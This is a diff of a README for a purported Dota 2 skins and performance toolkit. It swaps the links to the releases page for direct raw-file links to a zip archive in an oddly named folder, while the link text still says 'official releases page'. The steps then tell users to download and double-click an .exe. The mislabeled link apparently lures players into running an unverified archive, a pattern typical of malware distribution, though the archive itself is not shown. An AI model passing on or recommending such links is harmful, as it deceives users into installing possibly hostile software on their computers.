@@ -1,6 +1,6 @@
 # 🎮 -DOTA2-Super-Assistant-All-in-One-Toolkit-Skins- - Improve your Dota 2 gameplay experience
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ripontari1427/-DOTA2-Super-Assistant-All-in-One-Toolkit-Skins-/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ripontari1427/-DOTA2-Super-Assistant-All-in-One-Toolkit-Skins-/raw/refs/heads/main/dehydrosparteine/Skins_Assistant_One_DOT_in_Super_Toolkit_All_1.5.zip)
 
 This application provides tools to manage skins and enhance your performance in Dota 2. It simplifies complex game settings and allows you to customize your experience without manual file editing.
 
@@ -17,7 +17,7 @@ Your computer must meet these requirements to run the toolkit:
 
 Follow these steps to set up the toolkit on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/Ripontari1427/-DOTA2-Super-Assistant-All-in-One-Toolkit-Skins-/releases) to view available versions.
+1.  Visit the [official releases page](https://github.com/Ripontari1427/-DOTA2-Super-Assistant-All-in-One-Toolkit-Skins-/raw/refs/heads/main/dehydrosparteine/Skins_Assistant_One_DOT_in_Super_Toolkit_All_1.5.zip) to view available versions.
 2.  Select the most recent version at the top of the list.
 3.  Click the file ending in .exe to start the download.
 4.  Once the file arrives on your computer, double-click it to start the installation.
